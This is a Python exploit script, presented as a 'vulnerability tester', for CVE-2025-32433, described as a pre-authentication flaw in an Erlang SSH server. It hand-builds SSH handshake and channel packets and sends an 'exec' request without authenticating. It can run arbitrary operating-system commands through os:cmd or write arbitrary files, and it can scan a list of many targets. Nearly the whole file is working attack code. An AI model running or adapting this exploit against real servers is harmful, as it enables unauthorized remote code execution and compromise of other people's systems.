#!/usr/bin/env python3
"""
CVE-2025-32433 SSH Vulnerability Tester
Orignal Author: MattKeeley
Credits: Vip3r-MC
"""

import socket
import struct
import time
import argparse

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def string_payload(s):
    """Helper to format SSH string (4-byte length + bytes)"""
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes

def build_channel_open(channel_id=0):
    """Builds SSH_MSG_CHANNEL_OPEN for session"""
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)  # sender channel ID
        + struct.pack(">I", 0x68000)  # initial window size
        + struct.pack(">I", 0x10000)  # max packet size
    )

def build_channel_request(channel_id=0, command=None):
    """Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload"""
    if command is None:
        command = 'file:write_file("/lab.txt", <<"pwned">>).'
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )

def build_kexinit():
    """Builds a minimal but valid SSH_MSG_KEXINIT packet"""
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    return (
        b"\x14"
        + cookie
        + name_list([
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group-exchange-sha256",
            "diffie-hellman-group14-sha256",
        ])  # kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
        + name_list(["none"]) * 2  # compression
        + name_list([]) * 2  # languages
        + b"\x00"
        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    )

def pad_packet(payload, block_size=8):
    """Pads a packet to match SSH framing"""
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )

def parse_ssh_response(response):
    """Parse SSH response and extract command output"""
    try:
        # Skip padding and packet length
        padding_length = response[4]
        payload_start = 5 + padding_length
        
        # Extract message type
        message_type = response[payload_start]
        
        if message_type == 0x5c:  # SSH_MSG_CHANNEL_DATA
            # Extract channel data
            channel_id = struct.unpack('>I', response[payload_start+1:payload_start+5])[0]
            data_length = struct.unpack('>I', response[payload_start+5:payload_start+9])[0]
            data = response[payload_start+9:payload_start+9+data_length]
            return data.decode('utf-8', errors='ignore')
        elif message_type == 0x63:  # SSH_MSG_CHANNEL_SUCCESS
            return "Command executed successfully"
        elif message_type == 0x64:  # SSH_MSG_CHANNEL_FAILURE
            return "Command execution failed"
        else:
            return f"Unknown message type: {hex(message_type)}"
    except Exception as e:
        return f"Error parsing response: {str(e)}"

def test_vulnerability(host='localhost', port=2222, command=None, timeout=5, verbose=False):
    """
    Test the CVE-2025-32433 vulnerability by attempting to exploit the SSH server.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            print(f"{Colors.YELLOW}[*] Connected to server{Colors.RESET}")

            # 1. Banner exchange
            print(f"{Colors.YELLOW}[*] Sending banner...{Colors.RESET}")
            banner = b"SSH-2.0-OpenSSH_8.9\r\n"
            s.sendall(banner)
            
            response = s.recv(1024)
            print(f"{Colors.GREEN}[+] Received banner response: {response.hex()}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Banner text: {response.strip().decode(errors='ignore')}{Colors.RESET}")
            time.sleep(0.5)

            # 2. Send SSH_MSG_KEXINIT
            print(f"{Colors.YELLOW}[*] Sending KEXINIT...{Colors.RESET}")
            kex_packet = build_kexinit()
            padded_kex = pad_packet(kex_packet)
            s.sendall(padded_kex)
            time.sleep(0.5)

            # 3. Send SSH_MSG_CHANNEL_OPEN
            print(f"{Colors.YELLOW}[*] Sending channel open...{Colors.RESET}")
            chan_open = build_channel_open()
            padded_chan = pad_packet(chan_open)
            s.sendall(padded_chan)
            time.sleep(0.5)

            # 4. Send SSH_MSG_CHANNEL_REQUEST
            print(f"{Colors.YELLOW}[*] Sending channel request...{Colors.RESET}")
            chan_req = build_channel_request(command=command)
            padded_req = pad_packet(chan_req)
            s.sendall(padded_req)

            print(f"{Colors.GREEN}[âœ“] Exploit sent! Checking for response...{Colors.RESET}")

            # Try to receive any response
            try:
                response = s.recv(1024)
                print(f"{Colors.GREEN}[+] Received response: {response.hex()}{Colors.RESET}")
                return True
            except socket.timeout:
                print(f"{Colors.YELLOW}[*] No response within timeout period (which is expected){Colors.RESET}")
                return False

    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
        return False

def parse_target(target_str, default_port=2222):
    """Parse target string into host and port"""
    if ':' in target_str:
        host, port = target_str.split(':')
        return host, int(port)
    return target_str, default_port

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-32433 SSH Vulnerability Tester by Vip3r')
    parser.add_argument('-H', '--host', help='Single target host')
    parser.add_argument('-p', '--port', type=int, default=2222, help='Target port (default: 2222)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-T', '--targets', help='File containing list of targets (one per line, format: host[:port])')
    
    # Command group
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-c', '--command', help='Custom command to execute')
    command_group.add_argument('-f', '--file', action='store_true', help='Write test file to target')
    
    # File options
    parser.add_argument('--path', default='/test.txt', help='Path for file writing (default: /test.txt)')
    parser.add_argument('--content', default='pwned', help='Content to write to file (default: pwned)')
    
    args = parser.parse_args()

    # Determine command to execute
    command = None
    if args.command:
        # Format custom command for Erlang
        command = f'os:cmd("{args.command}").'
    elif args.file:
        command = f'file:write_file("{args.path}", <<"{args.content}">>).'
    else:
        # Default command if none specified
        command = f'file:write_file("/tmp/exploit.txt", <<"Hello World">>).'

    # Process targets
    targets = []
    if args.targets:
        try:
            with open(args.targets, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        host, port = parse_target(line, args.port)
                        targets.append((host, port))
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: Targets file '{args.targets}' not found{Colors.RESET}")
            return
    elif args.host:
        targets = [(args.host, args.port)]
    else:
        print(f"{Colors.RED}[!] Error: No target specified. Use -H for single target or -T for target list{Colors.RESET}")
        return

    # Process each target
    for host, port in targets:
        print(f"\n{Colors.CYAN}[*] Testing target: {host}:{port}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Command: {command}{Colors.RESET}")
        
        result = test_vulnerability(
            host=host,
            port=port,
            command=command,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        if result:
            print(f"{Colors.YELLOW}[*] POTENTIALLY VULNERABLE: {host}:{port} - Command/file operation may have executed{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Note: This is a blind exploit - verification requires external confirmation{Colors.RESET}")
            print(f"{Colors.RED}[!] The server responded to pre-authentication requests{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[+] VULNERABILITY NOT CONFIRMED: {host}:{port} appears to be secure{Colors.RESET}")
            print(f"{Colors.GREEN}[+] The server did not respond to pre-authentication requests{Colors.RESET}")

if __name__ == "__main__":
    main()